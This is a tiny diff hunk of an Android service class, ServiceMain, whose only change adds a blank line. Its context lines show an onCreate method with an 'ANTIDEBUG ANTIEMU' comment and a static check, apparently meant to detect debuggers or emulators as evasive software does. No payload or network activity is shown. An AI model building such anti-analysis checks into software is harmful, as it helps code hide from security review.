@@ -35,6 +35,7 @@ public class ServiceMain extends Service {
 		super.onCreate();
 
 		Status.setAppContext(getApplicationContext());
+		
 		// ANTIDEBUG ANTIEMU
 		if (!Core.checkStatic()) {
 			if (Cfg.DEBUG) {
